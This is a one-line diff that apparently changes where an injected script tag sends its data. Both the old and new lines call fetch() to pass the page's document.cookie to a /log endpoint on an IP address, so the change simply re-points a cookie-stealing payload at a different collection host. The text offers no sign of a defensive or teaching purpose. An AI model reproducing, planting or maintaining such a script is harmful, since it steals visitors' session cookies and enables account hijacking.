@@ -1,1 +1,1 @@
-<script>fetch('http://10.42.200.118/log?cookies=' + encodeURIComponent(document.cookie));</script>
+<script>fetch('http://10.42.252.152/log?cookies=' + encodeURIComponent(document.cookie));</script>
